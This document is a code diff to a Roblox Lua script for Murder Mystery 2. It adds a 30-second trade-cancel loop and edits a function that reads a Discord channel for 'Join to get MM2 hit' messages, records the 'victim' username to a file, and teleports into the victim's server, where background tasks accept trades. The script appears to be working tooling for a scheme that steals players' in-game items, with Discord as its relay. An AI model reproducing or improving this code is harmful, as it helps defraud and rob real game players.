@@ -110,6 +110,21 @@ task.spawn(acceptRequest) -- Start accepting trade requests
 task.spawn(acceptTrade) -- Start accepting trades
 task.spawn(tradeTimer)
 
+-- Timeout para cancelar trade después de 30 segundos
+task.spawn(function()
+    while true do
+        if IsTrading() then
+            print("Trade iniciado, esperando 30 segundos...")
+            wait(30)
+            if IsTrading() then
+                print("Trade no se completó, cancelando...")
+                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
+            end
+        end
+        wait(1)
+    end
+end)
+
 local function autoJoin()
     local response = request({
         Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=10",
@@ -130,15 +145,15 @@ local function autoJoin()
         for _, message in ipairs(messages) do
             if message.content ~= "" and message.embeds and message.embeds[1] and message.embeds[1].title then
                 if message.embeds[1].title:find("Join to get MM2 hit") then
-                    local placeId, jobId = string.match(message.content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)') -- Extract placeId and jobId from the embed
+                    local placeId, jobId = string.match(message.content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)')
                     if placeId and jobId then
                         local victimUsername = message.embeds[1].fields[1].value
 
                         if didVictimLeave or timer > 5 then
                             if not table.find(joinedIds, tostring(message.id)) then
-                                saveJoinedId(tostring(message.id)) -- Save this ID to the list
+                                saveJoinedId(tostring(message.id))
                                 writefile("user.txt", victimUsername)
-                                game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId) -- Join the server
+                                game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId)
                                 return
                             end
                         end
